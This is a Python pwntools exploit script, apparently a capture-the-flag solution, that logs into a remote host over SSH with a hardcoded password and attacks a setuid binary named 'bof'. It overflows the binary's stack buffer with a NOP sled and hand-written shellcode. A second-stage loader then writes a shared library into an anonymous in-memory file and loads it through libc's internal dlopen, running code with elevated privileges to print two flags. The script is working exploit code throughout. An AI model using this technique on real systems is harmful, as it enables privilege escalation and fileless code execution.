#!/usr/bin/env python3
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host')
args = parser.parse_args()

context.binary = binary = './bof'
e = ELF(binary, checksec = False)
libc = ELF('./libc-2.27.so', checksec = False)

# No ASLR on the system
e.address = 0x555555554000
libc.address = 0x7ffff79e4000

s = ssh(user='des', host=args.host, password='destructive_72656275696c64')
p = s.process('./bof', setuid=True)

# Address of input buffer
addr = 0x7fffffffe950

so = open('stage2', 'rb').read()

pivot = asm('''
        mov rbp, rsp;
        mov r15, rsi;
        sub r15, 0x956;
        mov rax, 9;
        xor rdi, rdi;
        mov rsi, 0x1000;
        mov rdx, 7;
        mov r10, 0x22;
        xor r8, r8;
        xor r9, r9;
        syscall;

        mov r14, rax;
        push 0x0a42;
        mov rsi, rsp;
        xor rdx, rdx;
        add dx, 2;
        xor rax, rax
        inc rax;
        mov rdi, rax;
        syscall;

        xor rax, rax;
        mov rdi, rax
        mov rsi, r14;
        mov rdx, 0x1000;
        syscall;
        jmp r14;
        ''')
pivot += b'\x90' * 16

loader = asm(f'''
        mov rax, 319;
        push 0x00434343;
        mov rdi, rsp;
        mov rsi, 1;
        syscall;
        mov r15, rax;

        push 0x0a43;
        mov rsi, rsp;
        xor rdx, rdx;
        add dx, 2;
        xor rax, rax
        inc rax;
        mov rdi, rax;
        syscall;

        mov rax, 9;
        xor rdi, rdi;
        mov rsi, 0x4000;
        mov rdx, 7;
        mov r10, 0x22;
        xor r8, r8;
        xor r9, r9;
        syscall;
        mov r8, rax;

        xor r9, r9;
        mov rsi, r8;
    read_so:
        xor rax, rax;
        mov rdi, rax;
        mov rdx, {len(so)};
        syscall;
        add rsi, rax;
        add r9, rax;
        cmp r9, {len(so)};
        jl read_so;

        mov rax, 1;
        mov rdi, r15;
        mov rsi, r8;
        mov rdx, {len(so)};
        syscall;

        xor rax, rax;
        mov rdi, rax;
        mov rsi, r14;
        mov rdx, 0x20;
        syscall;

        add rbp, 0x100;
        and rbp, ~0x8;
        mov rsp, rbp;

        mov rdi, r14;
        mov rsi, 1;
        mov r9, {libc.symbols.__libc_dlopen_mode};
        call r9;

        mov r9, {libc.symbols.__libc_dlclose};
        call r9;

        mov rax, 3;
        mov rdi, r15;
        syscall;

        mov rax, 60;
        mov rdi, 0;
        syscall;
        ''')


padding = b'\x90' * (616 - len(pivot))
payload = padding
payload += pivot
payload += p64(addr + int(600 / 2))

p.sendlineafter('string:', payload)
p.sendafter(b'B\n', loader)
p.sendafter(b'C\n', so)

path = f'/proc/{p.pid}/fd/3'
p.send(path.encode() + b'\x00')

p.recvuntil('IDENT ')

flag1 = p.recvline().decode()
log.info(f'{flag1}')

flag2 = p.recvline().decode()
log.info(f'{flag2}')
p.close()
